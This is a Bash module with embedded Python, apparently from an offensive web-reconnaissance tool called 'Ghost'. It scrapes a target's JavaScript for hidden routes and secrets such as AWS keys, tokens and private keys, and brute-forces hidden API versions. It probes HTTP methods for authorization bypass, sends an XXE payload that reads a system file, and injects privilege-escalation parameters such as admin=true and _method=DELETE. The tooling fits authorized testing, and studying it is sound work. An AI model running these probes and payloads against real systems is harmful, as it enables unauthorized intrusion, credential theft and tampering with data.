#!/bin/bash
# ============================================================
# Module 02: Ghost Endpoints
# ============================================================
# Smart endpoint discovery using techniques others skip:
#
# 1. JS AST-level Analysis - Parse JS for hidden routes/APIs
# 2. API Version Bruteforce - /api/v1 exists? Try v2,v3,v0,internal
# 3. Parameter Pollution - Find hidden params via reflection
# 4. HTTP Method Probing - Test all methods on each endpoint
# 5. Content-Type Confusion - Switch JSON↔XML↔form for diffs
# 6. Path Normalization Abuse - Unicode, double-encode, dots
# ============================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/core.sh"
source "${SCRIPT_DIR}/../../lib/config.sh"


# ============================================================
# 1. JS Deep Analysis (beyond simple regex)
# ============================================================
ghost_js_deep_analyze() {
    local urls_file="$1"
    local output_dir="${GHOST_OUTPUT}/endpoints/js-deep"
    mkdir -p "$output_dir"

    ghost_log phase "JS Deep Analysis"

    if [[ ! -s "$urls_file" ]]; then
        ghost_log warn "No URLs file for JS analysis"
        return
    fi

    # Download JS files
    mkdir -p "${output_dir}/raw"
    local js_count=0

    while IFS= read -r url; do
        ghost_rate_limit 0.15
        local fname="js_$(echo "$url" | md5sum | cut -c1-12).js"
        curl -s -H "${H1_HEADER}" --max-time 10 \
            "$url" -o "${output_dir}/raw/${fname}" 2>/dev/null
        echo "${url}|${fname}" >> "${output_dir}/js-map.txt"
        js_count=$((js_count + 1))
        [[ $js_count -ge 150 ]] && break
    done < "$urls_file"

    ghost_log info "Downloaded ${js_count} JS files"


    # Python script for deep JS analysis
    python3 << 'PYEOF' "${output_dir}/raw" "${output_dir}"
import os, re, sys, json
from pathlib import Path

js_dir = sys.argv[1]
out_dir = sys.argv[2]

endpoints = set()
secrets = []
api_patterns = set()
hidden_params = set()
internal_urls = set()
websocket_urls = set()
graphql_ops = set()

# Patterns that simple regex misses
ROUTE_PATTERNS = [
    # React/Angular/Vue router definitions
    r'path\s*:\s*["\'](/[^"\']+)["\']',
    r'route\s*\(\s*["\'](/[^"\']+)["\']',
    r'navigate\s*\(\s*["\'](/[^"\']+)["\']',
    r'push\s*\(\s*["\'](/[^"\']+)["\']',
    r'replace\s*\(\s*["\'](/[^"\']+)["\']',
    # Fetch/axios/XMLHttpRequest
    r'fetch\s*\(\s*["\']([^"\']+)["\']',
    r'axios\.[a-z]+\s*\(\s*["\']([^"\']+)["\']',
    r'\.open\s*\(\s*["\'][A-Z]+["\']\s*,\s*["\']([^"\']+)["\']',
    # String concatenation patterns for dynamic URLs
    r'["\']/(api|v[0-9]|internal|admin|private|hidden)/[^"\']*["\']',
    # Template literals
    r'`(/[^`]+)`',
    # GraphQL operations
    r'(query|mutation|subscription)\s+(\w+)',
    # WebSocket connections
    r'wss?://[^"\'`\s]+',
]

SECRET_PATTERNS = [
    (r'AKIA[0-9A-Z]{16}', 'AWS_ACCESS_KEY'),
    (r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', 'JWT_TOKEN'),
    (r'AIza[0-9A-Za-z_-]{35}', 'GOOGLE_API_KEY'),
    (r'xox[baprs]-[0-9a-zA-Z-]+', 'SLACK_TOKEN'),
    (r'sk_live_[0-9a-zA-Z]{24,}', 'STRIPE_SECRET'),
    (r'ghp_[0-9a-zA-Z]{36}', 'GITHUB_TOKEN'),
    (r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----', 'PRIVATE_KEY'),
    (r'(?:password|passwd|pwd)\s*[=:]\s*["\']([^"\']{4,})["\']', 'HARDCODED_PASSWORD'),
    (r'(?:secret|token|auth)[_-]?(?:key)?\s*[=:]\s*["\']([a-zA-Z0-9_\-]{16,})["\']', 'SECRET_VALUE'),
]

PARAM_PATTERNS = [
    r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)\s*=',
    r'params\[?["\']([a-zA-Z_]\w*)["\']',
    r'getParameter\s*\(\s*["\'](\w+)["\']',
    r'searchParams\.get\s*\(\s*["\'](\w+)["\']',
    r'req\.(?:query|body|params)\.(\w+)',
]

for js_file in Path(js_dir).glob("*.js"):
    try:
        content = js_file.read_text(errors='ignore')
    except:
        continue

    # Extract endpoints
    for pattern in ROUTE_PATTERNS:
        for match in re.finditer(pattern, content):
            endpoint = match.group(1) if match.lastindex else match.group(0)
            if endpoint.startswith('/') or endpoint.startswith('http'):
                endpoints.add(endpoint)

    # Extract secrets
    for pattern, stype in SECRET_PATTERNS:
        for match in re.finditer(pattern, content):
            val = match.group(0)[:80]  # Truncate
            secrets.append({"type": stype, "value": val, "file": js_file.name})

    # Extract params
    for pattern in PARAM_PATTERNS:
        for match in re.finditer(pattern, content):
            hidden_params.add(match.group(1))

    # WebSocket URLs
    for match in re.finditer(r'wss?://[^\s"\'`<>]+', content):
        websocket_urls.add(match.group(0))

    # GraphQL operations
    for match in re.finditer(r'(query|mutation|subscription)\s+(\w+)', content):
        graphql_ops.add(f"{match.group(1)}:{match.group(2)}")

    # Internal/hidden URLs
    for match in re.finditer(r'https?://[^\s"\'`<>]+', content):
        url = match.group(0)
        if any(k in url.lower() for k in ['internal', 'admin', 'staging', 'dev', 'test', 'debug', 'private']):
            internal_urls.add(url)

# Write outputs
with open(f"{out_dir}/endpoints-deep.txt", 'w') as f:
    f.write('\n'.join(sorted(endpoints)))

with open(f"{out_dir}/secrets-deep.json", 'w') as f:
    json.dump(secrets, f, indent=2)

with open(f"{out_dir}/hidden-params.txt", 'w') as f:
    f.write('\n'.join(sorted(hidden_params)))

with open(f"{out_dir}/websocket-urls.txt", 'w') as f:
    f.write('\n'.join(sorted(websocket_urls)))

with open(f"{out_dir}/graphql-operations.txt", 'w') as f:
    f.write('\n'.join(sorted(graphql_ops)))

with open(f"{out_dir}/internal-urls.txt", 'w') as f:
    f.write('\n'.join(sorted(internal_urls)))

print(f"Endpoints: {len(endpoints)}")
print(f"Secrets: {len(secrets)}")
print(f"Hidden params: {len(hidden_params)}")
print(f"WebSocket URLs: {len(websocket_urls)}")
print(f"GraphQL ops: {len(graphql_ops)}")
print(f"Internal URLs: {len(internal_urls)}")
PYEOF

    # Report results
    [[ -s "${output_dir}/endpoints-deep.txt" ]] && \
        ghost_log hit "Deep endpoints: $(wc -l < "${output_dir}/endpoints-deep.txt")"
    [[ -s "${output_dir}/secrets-deep.json" ]] && \
        ghost_log hit "Potential secrets: $(jq length "${output_dir}/secrets-deep.json" 2>/dev/null || echo 0)"
    [[ -s "${output_dir}/hidden-params.txt" ]] && \
        ghost_log hit "Hidden parameters: $(wc -l < "${output_dir}/hidden-params.txt")"
    [[ -s "${output_dir}/websocket-urls.txt" ]] && \
        ghost_log hit "WebSocket URLs: $(wc -l < "${output_dir}/websocket-urls.txt")"
    [[ -s "${output_dir}/graphql-operations.txt" ]] && \
        ghost_log hit "GraphQL operations: $(wc -l < "${output_dir}/graphql-operations.txt")"
}


# ============================================================
# 2. API Version Bruteforce
# ============================================================
# If /api/v1/users exists, try v0, v2, v3, v4, internal, beta, dev
# Older/hidden versions often have less auth, more bugs

ghost_api_version_hunt() {
    local endpoints_file="$1"
    local output_dir="${GHOST_OUTPUT}/endpoints/api-versions"
    mkdir -p "$output_dir"

    ghost_log phase "API Version Hunting"

    if [[ ! -s "$endpoints_file" ]]; then
        ghost_log warn "No endpoints file"
        return
    fi

    # Extract base URLs that have versioned APIs
    local versioned_apis="${output_dir}/versioned-base.txt"
    grep -oP 'https?://[^/]+/(?:api/)?v[0-9]+' "$endpoints_file" | sort -u > "$versioned_apis" 2>/dev/null || true

    if [[ ! -s "$versioned_apis" ]]; then
        ghost_log info "No versioned APIs found, trying common patterns..."
        # Try against all alive hosts
        while IFS= read -r url; do
            echo "${url}/api/v1" >> "$versioned_apis"
        done < <(head -20 "$endpoints_file" | grep -oP 'https?://[^/]+')
    fi

    local VERSION_ATTEMPTS=("v0" "v1" "v2" "v3" "v4" "v5" "v0.1" "v1.0" "v1.1" "v2.0" "v2.1" \
        "internal" "beta" "alpha" "dev" "test" "staging" "debug" "private" "admin" "legacy" "old" "new")

    ghost_log info "Testing $(wc -l < "$versioned_apis") API bases against ${#VERSION_ATTEMPTS[@]} versions..."

    while IFS= read -r api_base; do
        # Extract the host and path prefix
        local host=$(echo "$api_base" | grep -oP 'https?://[^/]+')
        local known_version=$(echo "$api_base" | grep -oP 'v[0-9]+')

        for ver in "${VERSION_ATTEMPTS[@]}"; do
            [[ "$ver" == "$known_version" ]] && continue
            ghost_rate_limit 0.1

            local test_url="${host}/api/${ver}/users"
            local result=$(ghost_request "$test_url")
            local status=$(echo "$result" | cut -d'|' -f1)
            local size=$(echo "$result" | cut -d'|' -f3)
            local body_file=$(echo "$result" | cut -d'|' -f5)

            # Interesting if: 200, 401 (auth required = exists), 403 (forbidden = exists)
            if [[ "$status" == "200" || "$status" == "401" || "$status" == "403" ]]; then
                ghost_log hit "API version found: ${host}/api/${ver}/ (status: ${status})"
                echo "${host}/api/${ver}/|${status}|${size}" >> "${output_dir}/found-versions.txt"

                if [[ "$status" == "200" && $size -gt 50 ]]; then
                    ghost_finding "high" \
                        "Hidden API version accessible: ${host}/api/${ver}/" \
                        "Undocumented API version responds with data. May have weaker auth controls." \
                        "Status: ${status}, Size: ${size}"
                fi
            fi

            rm -f "$body_file" 2>/dev/null
        done
    done < <(head -10 "$versioned_apis")

    [[ -s "${output_dir}/found-versions.txt" ]] && \
        ghost_log hit "Hidden API versions found: $(wc -l < "${output_dir}/found-versions.txt")"
}


# ============================================================
# 3. HTTP Method Probing (find method confusion bugs)
# ============================================================
# Test each endpoint with all HTTP methods. Key findings:
# - GET returns 403 but POST returns 200 = auth bypass
# - PUT/PATCH accessible = potential data modification
# - DELETE accessible = potential data destruction
# - OPTIONS reveals allowed methods (CORS + method info)

ghost_method_probe() {
    local urls_file="$1"
    local output_dir="${GHOST_OUTPUT}/endpoints/method-probe"
    mkdir -p "$output_dir"

    ghost_log phase "HTTP Method Probing"

    if [[ ! -s "$urls_file" ]]; then
        ghost_log warn "No URLs file"
        return
    fi

    local METHODS=("GET" "POST" "PUT" "PATCH" "DELETE" "OPTIONS" "HEAD" "TRACE")

    ghost_log info "Testing $(head -50 "$urls_file" | wc -l) URLs with ${#METHODS[@]} methods..."

    while IFS= read -r url; do
        local baseline_status=""
        local method_results=""

        for method in "${METHODS[@]}"; do
            ghost_rate_limit 0.1
            local result=$(ghost_request "$url" "$method")
            local status=$(echo "$result" | cut -d'|' -f1)
            local size=$(echo "$result" | cut -d'|' -f3)
            local body_file=$(echo "$result" | cut -d'|' -f5)

            [[ "$method" == "GET" ]] && baseline_status="$status"

            method_results="${method_results}${method}:${status}:${size},"

            # Flag interesting discrepancies
            if [[ -n "$baseline_status" && "$baseline_status" =~ ^(403|401)$ ]]; then
                if [[ "$status" == "200" && "$method" != "GET" && "$method" != "OPTIONS" ]]; then
                    ghost_finding "high" \
                        "Method-based auth bypass: ${method} ${url}" \
                        "GET returns ${baseline_status} but ${method} returns 200. Possible authorization bypass." \
                        "GET→${baseline_status}, ${method}→${status} (size:${size})"
                fi
            fi

            # TRACE enabled = potential XST (Cross-Site Tracing)
            if [[ "$method" == "TRACE" && "$status" == "200" ]]; then
                ghost_finding "medium" \
                    "TRACE method enabled: ${url}" \
                    "TRACE method responds 200. Potential Cross-Site Tracing (XST) if cookies lack HttpOnly." \
                    "TRACE ${url} → 200"
            fi

            rm -f "$body_file" 2>/dev/null
        done

        echo "${url}|${method_results}" >> "${output_dir}/method-matrix.txt"
    done < <(head -50 "$urls_file")

    ghost_log info "Method matrix saved: ${output_dir}/method-matrix.txt"
}


# ============================================================
# 4. Content-Type Confusion Testing
# ============================================================
# Send same request with different Content-Types. Servers that
# parse both JSON and XML may be vulnerable to XXE when you
# switch to XML. Form-encoded vs JSON can bypass WAF.

ghost_content_type_confusion() {
    local urls_file="$1"
    local output_dir="${GHOST_OUTPUT}/endpoints/content-type"
    mkdir -p "$output_dir"

    ghost_log phase "Content-Type Confusion Testing"

    if [[ ! -s "$urls_file" ]]; then
        ghost_log warn "No URLs file"
        return
    fi

    # Test with different content types on POST endpoints
    local CONTENT_TYPES=(
        "application/json"
        "application/xml"
        "application/x-www-form-urlencoded"
        "text/xml"
        "multipart/form-data; boundary=----Ghost"
        "application/json; charset=utf-8"
        "text/plain"
    )

    # Sample payloads for each type
    local JSON_BODY='{"test":"ghost","id":1}'
    local XML_BODY='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><test>&xxe;</test></root>'
    local FORM_BODY='test=ghost&id=1'

    while IFS= read -r url; do
        local responses=""

        for ct in "${CONTENT_TYPES[@]}"; do
            ghost_rate_limit 0.15

            local body="$JSON_BODY"
            [[ "$ct" == *xml* ]] && body="$XML_BODY"
            [[ "$ct" == *form* ]] && body="$FORM_BODY"

            local result=$(ghost_request "$url" "POST" "$body" "Content-Type: ${ct}")
            local status=$(echo "$result" | cut -d'|' -f1)
            local size=$(echo "$result" | cut -d'|' -f3)
            local body_file=$(echo "$result" | cut -d'|' -f5)

            responses="${responses}${ct}→${status}(${size}),"

            # Check for XXE indicators in XML responses
            if [[ "$ct" == *xml* && -f "$body_file" ]]; then
                if grep -qiE '(root|hostname|localhost|etc/passwd|SYSTEM)' "$body_file" 2>/dev/null; then
                    ghost_finding "critical" \
                        "Potential XXE: ${url}" \
                        "XML Content-Type accepted and entity processed. Check for data exfiltration." \
                        "Content-Type: ${ct}, Response contains entity markers"
                fi
            fi

            # If JSON endpoint also accepts XML (content-type confusion)
            if [[ "$ct" == *xml* && "$status" == "200" ]]; then
                ghost_log hit "Accepts XML! Potential XXE target: ${url}"
                echo "${url}|accepts_xml|${status}" >> "${output_dir}/xml-accepting.txt"
            fi

            rm -f "$body_file" 2>/dev/null
        done

        echo "${url}|${responses}" >> "${output_dir}/content-type-matrix.txt"
    done < <(head -30 "$urls_file")

    [[ -s "${output_dir}/xml-accepting.txt" ]] && \
        ghost_log hit "Endpoints accepting XML: $(wc -l < "${output_dir}/xml-accepting.txt") - TEST FOR XXE!"
}


# ============================================================
# 5. Parameter Pollution & Hidden Param Discovery
# ============================================================
# Instead of standard wordlist fuzzing, we:
# - Reflect-test: add params, see if they appear in response
# - Duplicate params: param=a&param=b (HPP)
# - Array injection: param[]=a&param[]=b
# - JSON injection in query: ?json={"admin":true}

ghost_param_pollution() {
    local urls_file="$1"
    local output_dir="${GHOST_OUTPUT}/endpoints/param-pollution"
    mkdir -p "$output_dir"

    ghost_log phase "Parameter Pollution & Hidden Params"

    if [[ ! -s "$urls_file" ]]; then
        ghost_log warn "No URLs file"
        return
    fi

    # High-value params to test (banking-specific)
    local TEST_PARAMS=(
        "admin=true" "debug=1" "test=1" "internal=1"
        "role=admin" "isAdmin=true" "privilege=high"
        "access_level=9" "user_type=admin" "bypass=1"
        "verbose=true" "trace=1" "log_level=debug"
        "format=json" "callback=ghost" "jsonp=ghost"
        "_method=PUT" "_method=DELETE"
        "X-HTTP-Method-Override=PUT"
    )

    while IFS= read -r url; do
        # Get baseline
        ghost_rate_limit 0.1
        local baseline=$(ghost_request "$url")
        local base_status=$(echo "$baseline" | cut -d'|' -f1)
        local base_size=$(echo "$baseline" | cut -d'|' -f3)
        local base_body=$(echo "$baseline" | cut -d'|' -f5)

        local separator="?"
        [[ "$url" == *"?"* ]] && separator="&"

        for param in "${TEST_PARAMS[@]}"; do
            ghost_rate_limit 0.1
            local test_url="${url}${separator}${param}"
            local result=$(ghost_request "$test_url")
            local status=$(echo "$result" | cut -d'|' -f1)
            local size=$(echo "$result" | cut -d'|' -f3)
            local body_file=$(echo "$result" | cut -d'|' -f5)

            # Detect behavioral difference
            local size_diff=$(( size - base_size ))
            [[ $size_diff -lt 0 ]] && size_diff=$(( -size_diff ))

            if [[ "$status" != "$base_status" || $size_diff -gt 100 ]]; then
                ghost_log hit "Param affects response: ${param} on ${url}"
                echo "${url}|${param}|status:${base_status}→${status}|size_diff:${size_diff}" \
                    >> "${output_dir}/affecting-params.txt"

                if [[ "$param" == *"admin"* || "$param" == *"role"* || "$param" == *"privilege"* ]]; then
                    ghost_finding "high" \
                        "Privilege parameter accepted: ${param} on ${url}" \
                        "Adding ${param} changes response (status: ${base_status}→${status}, size_diff: ${size_diff}). Possible privilege escalation." \
                        "${test_url}"
                fi
            fi

            rm -f "$body_file" 2>/dev/null
        done

        rm -f "$base_body" 2>/dev/null
    done < <(head -20 "$urls_file")

    [[ -s "${output_dir}/affecting-params.txt" ]] && \
        ghost_log hit "Parameters affecting responses: $(wc -l < "${output_dir}/affecting-params.txt")"
}


# ============================================================
# Main Endpoint Runner
# ============================================================
ghost_endpoints_run() {
    local js_file="${1:-}"
    local urls_file="${2:-}"
    local endpoints_file="${3:-}"

    ghost_log phase "GHOST ENDPOINTS MODULE"

    # JS deep analysis
    if [[ -n "$js_file" && -s "$js_file" ]]; then
        ghost_js_deep_analyze "$js_file"
    fi

    # API version hunting
    if [[ -n "$endpoints_file" && -s "$endpoints_file" ]]; then
        ghost_api_version_hunt "$endpoints_file"
    elif [[ -n "$urls_file" && -s "$urls_file" ]]; then
        ghost_api_version_hunt "$urls_file"
    fi

    # Method probing
    if [[ -n "$urls_file" && -s "$urls_file" ]]; then
        ghost_method_probe "$urls_file"
    fi

    # Content-type confusion
    if [[ -n "$urls_file" && -s "$urls_file" ]]; then
        ghost_content_type_confusion "$urls_file"
    fi

    # Parameter pollution
    if [[ -n "$urls_file" && -s "$urls_file" ]]; then
        ghost_param_pollution "$urls_file"
    fi

    ghost_log phase "ENDPOINT ANALYSIS COMPLETE"
}

# Run if executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    ghost_endpoints_run "$@"
fi
